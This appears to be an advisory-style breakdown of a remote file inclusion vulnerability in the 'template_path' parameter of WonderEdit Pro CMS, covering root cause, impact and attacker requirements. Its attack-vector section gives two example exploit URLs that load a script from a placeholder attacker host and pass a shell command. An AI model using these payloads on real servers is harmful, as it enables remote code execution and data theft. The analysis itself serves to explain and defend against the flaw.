Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability is due to a lack of proper input sanitization in the `template_path` parameter within the WonderEdit Pro CMS. This allows an attacker to include arbitrary remote files.
*   **Weaknesses/Vulnerabilities:**
    *   **Remote File Inclusion (RFI):** The application directly includes a file specified in the `template_path` parameter, without any sanitization or validation.
*   **Impact of Exploitation:**
    *   An attacker can execute arbitrary code on the server by including a malicious file from a remote location. This could lead to a full compromise of the web server, data theft, or other malicious actions.
*  **Attack Vectors:**
    *   The vulnerability is exploited through HTTP GET requests by manipulating the `template_path` parameter in URLs such as:
        *   `http://[target]/[path]/template/rwb/user_bottom.php?config[template_path]=http://[attacker]/cmd.txt?&cmd=ls`
        *   `http://[target]/[path]/template/gwb/user_bottom.php?config[template_path]=http://[attacker]/cmd.txt?&cmd=ls`
*   **Required Attacker Capabilities/Position:**
    *   The attacker needs to be able to send HTTP requests to the vulnerable server.
    *   The attacker needs a server to host the malicious file to be included.
